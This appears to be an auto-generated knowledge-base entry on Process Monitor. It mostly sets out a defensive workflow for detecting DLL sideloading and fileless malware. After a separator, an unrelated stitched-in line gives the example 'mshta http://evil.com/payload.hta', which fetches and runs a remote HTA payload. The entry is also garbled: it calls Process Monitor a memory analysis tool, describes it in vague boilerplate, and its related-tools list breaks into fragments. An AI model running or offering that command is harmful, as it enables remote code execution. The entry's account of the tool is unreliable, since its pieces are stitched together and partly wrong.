# Process Monitor

## Overview
Process Monitor is a memory analysis tool that appears across malware analysis workflows in this knowledge base. It is referenced as part of higher-level security analysis, investigation, monitoring, or validation activity rather than as an end in itself.

## What It Is
Process Monitor is best understood as a malware-analysis tool in this knowledge base. Its role is conceptual and system-facing rather than procedural: it gives analysts or defenders a structured way to examine evidence, model system behavior, or reason about security state.

## How It Works
Process Monitor works by turning technical inputs into more interpretable outputs at the system level. Across the source skills, it appears as part of larger analysis, investigation, monitoring, or validation loops rather than as a standalone end state.

## Core Concepts
- threat hunting
- mitre attack
- dll sideloading
- defense evasion
- t1574
- edr
- proactive detection
- malware
- fileless
- LOLBins
- memory analysis
- detection

## Typical Workflow
- 1. **Identify Sideloading Targets**: Research known vulnerable applications that load DLLs without full path qualification (LOLBAS, DLL-sideload databases).
- 2. **Monitor DLL Load Events**: Query Sysmon Event ID 7 for DLL loads where the DLL path differs from the application's expected directory.
- 3. **Check DLL Signatures**: Flag unsigned or untrusted DLLs loaded by signed executables.
- 4. **Detect Path Anomalies**: Identify legitimate executables running from unusual locations (Temp, AppData, Public) that may be decoy wrappers.
- 5. **Hash Verification**: Compare loaded DLL hashes against known-good versions and threat intel feeds.
- 6. **Correlate with Process Behavior**: Check if the host process exhibits unusual behavior (network connections, child processes) after loading the suspicious DLL.
- 7. **Document and Remediate**: Report sideloading instances, quarantine malicious DLLs, and update detection rules.
- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- Abuse: Execute HTA files with embedded VBScript/JScript
- Example: mshta http://evil.com/payload.hta

## Use Cases
- When investigating potential DLL hijacking in enterprise environments
- After EDR alerts on unsigned DLLs loaded by signed applications
- When hunting for APT persistence using legitimate application wrappers
- During incident response to identify trojanized applications
- When threat intel indicates DLL sideloading campaigns targeting specific software
- EDR alerts indicate suspicious behavior from trusted system binaries (PowerShell, mshta, wmic, regsvr32)
- Investigating attacks that leave no traditional malware files on disk
- Analyzing WMI event subscriptions, registry-stored payloads, or scheduled task abuse for persistence
- Building detection rules for LOLBin (Living Off the Land Binary) abuse in enterprise environments
- Memory forensics reveals malicious code but no corresponding files exist on the filesystem

## Limitations
- Output still depends on context, data quality, and surrounding analysis.
- The tool should be interpreted as part of a broader workflow, not as a complete answer by itself.
- Capabilities and visibility vary depending on environment, integrations, and available inputs.

## Related Tools
- Sysmon, And Fileless Malware Artifacts, And Network Connections, And Process Activity For Observing Fileless Attack Behavior, And Registry Entries, Autoruns, CrowdStrike Falcon, DLL Export Viewer

## Sources
- detecting-dll-sideloading-attacks
- detecting-fileless-malware-techniques
